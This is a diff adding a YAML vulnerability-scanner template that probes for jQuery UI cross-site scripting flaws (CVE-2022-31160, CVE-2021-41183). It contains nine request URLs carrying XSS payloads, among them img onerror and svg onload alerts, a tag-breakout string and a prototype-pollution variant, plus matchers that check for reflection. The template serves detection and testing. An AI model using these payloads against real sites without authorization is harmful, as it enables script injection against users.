@@ -1,0 +1,35 @@
+id: XSS-jQuery
+
+info:
+  name: XSS in JQuery
+  author: abdulrahman
+  severity: medium
+  tags: xss
+
+# CVE-2022-31160 : The XSS payload in injected into the <lable> tag element with URL-encoded character
+# Jquert UI <- 1.13.2 Payload is decoded to HTML and XSS is trigger when specific JS Code is executed.
+
+# CVE-2021-41183: The XSS payload is injected directly into DatePicker initialization script
+# JQuery UI < 1.13.0 : Payload are executed when special condition are met, see comment
+requests: 
+  - method: GET
+    path: 
+      - "{{BaseURL}}/?q=%26lt;img src=1 onerror=alert(1234)%26gt;"
+      - "{{BaseURL}}/?prevText=<img src=1 onerror=alert(1234)>&nextText=..."
+      - "{{BaseURL}}/?altField=<img src=1 onerror=alert(1234)>"
+      - "{{BaseURL}}/?pos=<img src=1 onerror=alert(1234)>"
+      - "{{BaseURL}}/?option=<img src=1 onerror=alert(1234)>"
+      - "{{BaseURL}}/?title=<img src=1 onerror=alert(1234)>"
+      - "{{BaseURL}}/?q=<option><style></option></select><img src=1 onerror=alert(1)></style>"
+      - '{{BaseURL}}/?q=<img alt="<x" title="/><svg onload=alert(1234)>">'
+      - "{{BaseURL}}/?q=books&__proto__[backLink]=<svg onload=alert(1234)>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<img src=1 onerror=alert(1234)>"
+          - '<img alt="<x" title="/><svg onload=alert(1234)>">'
+          - "<svg onload=alert(1234)>"
+
